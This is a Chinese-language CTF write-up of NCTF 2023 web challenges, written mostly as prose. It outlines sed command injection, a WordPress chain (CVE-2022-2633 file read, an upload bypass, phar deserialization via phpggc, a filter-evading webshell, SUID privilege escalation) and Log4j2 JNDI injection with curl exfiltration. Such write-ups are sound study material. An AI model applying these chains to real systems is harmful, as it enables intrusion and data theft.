NCTF2023wp-web

本文最后更新于：几秒前

2023nctf

协会群里随机组队，web一共做出来三道，还是菜了，java的题都没接触过，全是从头开始学然后利用，还好考的不算偏，都能搜到，还侥幸拿了个一血。剩下的题等官方wp复现

webshell

下载框，任意文件读取，无权访问 /flag

主要文件有三个

index.php

download.php

generate.sh

可以控制环境变量和任意文件读取，但是不能修改环境变量的名字，所以不能尝试利用 LD_PRELOAD

在sed里利用 / 截断，可以任意命令执行(要在命令头加个 e，没来得及研究为啥，echo的时候试出来的)，先尝试 curl 看看是否出网

这里尝试弹shell，卡了半天，最后改用写文件，直接出

wordpress

利用wpscan扫到了相关信息，其中用到了 all-in-one-video-gallery 插件，经过搜索得知存在两个漏洞，ssrf 和 任意文件读取，其实就是同一个地方的两种不同利用

[WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633 | PeiQi文库 (wgpsec.org)](https://peiqi.wgpsec.org/wiki/serverapp/WordPress/WordPress All-in-One Video Gallery video.php 任意文件读取漏洞 CVE-2022-2633.html)

https://downloads.wordpress.org/plugin/all-in-one-video-gallery.2.6.0.zip

下载源码，定位到漏洞位置，查看具体过程，好叭，就是单纯读出来

先尝试了任意文件读取，确实能读到 /etc/passwd

但是尝试 /flag 却失败，尝试读环境变量，没发现flag

试试伪协议，能读，不能执行

卡了三四个小时，回到信息收集，整理已有信息

查看wpscan给我发的扫描报告，发现可利用的漏洞有: ssrf，任意文件读取，任意文件上传，还有wp版本的任意文件执行(需要反序列化链)，一个思路出现了：文件上传->phar协议读取->原生态反序列化->RCE

现在开始去找文件上传点拖放多个文件上传 - 联系表单 7 <= 1.3.7.3 - 未经身份验证的任意文件上传 (wordfence.com)

找错地方了….

走了两个多小时弯路，最后发现是这篇Drag and Drop Multiple File Upload < 1.3.6.5 – File Upload Size Limit Bypass | Plugin Vulnerabilities (wpscan.com)

现在去构造链然后做phar，用 phpggc (标的cmd但其实是函数调用)

生成phar文件，改后缀为png，上传

在readme里看到临时上传目录 /wp-content/uploads/wp_dndcf7_uploads

burp准备利用phar协议读文件 phar:///var/www/html/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/exp.png

成功上传，也能正常执行命令，但是反弹shell失败了，尝试写入webshell，过滤了 $_REQUEST $_POST $_GET

再经过测试，是匹配每一个 $ 到 ] 中间的全部删掉，改用 eval(file_contect('php://input')) ，md，过滤我单引号

最后得到的结论是…没有转义…

上马，出城，suid提权 date ，这里搜索的方式不对，导致上来就排除正确答案，唉

logging

log4j2的rce，fuzz请求头，发现 Accect 参数的值会被记录并解析，dnslog验证可用，利用工具 JNDI-Injection-Exploit ，尝试反弹shell卡了好久，最后用curl外带出 flag，记得带套 {}

python -m http.server 9999
